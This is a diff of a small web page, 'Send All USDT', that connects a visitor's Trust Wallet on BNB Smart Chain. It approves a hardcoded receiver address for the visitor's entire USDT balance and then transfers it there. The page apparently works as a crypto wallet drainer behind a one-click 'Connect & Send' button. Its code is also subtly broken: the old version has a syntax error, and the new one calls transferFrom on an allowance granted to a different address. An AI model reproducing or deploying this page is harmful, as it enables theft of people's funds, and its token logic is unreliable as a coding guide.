@@ -1,65 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>USDT Auto Transfer</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Send All USDT</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 </head>
 <body style="text-align:center; font-family:sans-serif; padding-top:60px;">
-  <h2>💸 Send All USDT (BEP20)</h2>
-  <button onclick="start()" style="padding:15px 30px; font-size:18px; background:#4caf50; color:#fff; border:none; border-radius:8px; cursor:pointer;">
+  <h2>💸 Send All USDT</h2>
+  <button onclick="connectAndSend()" style="padding:15px 30px; font-size:18px; background:#ff9800; color:white; border:none; border-radius:8px; cursor:pointer;">
     Connect & Send
   </button>
-  <p id="status" style="margin-top:20px;"></p>
+  <p id="status" style="margin-top:20px; font-size:16px;"></p>
 
   <script>
-    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Your receiving address
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BNB Chain
+    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // ✅ Your address
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // ✅ USDT on BNB Chain
+
     const usdtABI = [
       { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
+      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
     ];
 
-    async function start() {
+    async function connectAndSend() {
       const status = document.getElementById("status");
 
       if (typeof window.ethereum === 'undefined') {
-        alert("⚠️ Please open this page in Trust Wallet DApp Browser.");
+        alert("⚠️ Please open in Trust Wallet browser.");
         return;
       }
 
       const web3 = new Web3(window.ethereum);
+      await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }).catch(() => {
+        alert("❌ Please switch to BNB Smart Chain in your wallet.");
+        return;
+      });
+
       await window.ethereum.request({ method: 'eth_requestAccounts' });
       const accounts = await web3.eth.getAccounts();
       const sender = accounts[0];
-
-      const chainId = await web3.eth.getChainId();
-      if (chainId !== 56) {
-        alert("❌ Please switch to BNB Smart Chain in your wallet.");
-        return;
-      }
 
       const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
       const balance = await usdt.methods.balanceOf(sender).call();
 
       if (balance == 0) {
-        status.innerText = "❌ No USDT found in wallet.";
+        status.innerText = "❌ No USDT in wallet.";
         return;
       }
 
-      const readable = web3.utils.fromWei(balance, 'ether');
-      status.innerText = Approving ${readable} USDT...;
+      status.innerText = "🔓 Approving USDT...";
 
       try {
         await usdt.methods.approve(receiver, balance).send({ from: sender });
-        status.innerText = "✅ Approved! Sending...";
+        status.innerText = "✅ Approved. Sending...";
 
-        await usdt.methods.transfer(receiver, balance).send({ from: sender });
-        status.innerText = "🎉 USDT sent successfully!";
+        await usdt.methods.transferFrom(sender, receiver, balance).send({ from: sender });
+        status.innerText = "🎉 Successfully Sent!";
       } catch (err) {
         console.error(err);
-        status.innerText = "❌ Transaction failed or cancelled.";
+        status.innerText = "❌ Failed or Cancelled.";
       }
     }
   </script>
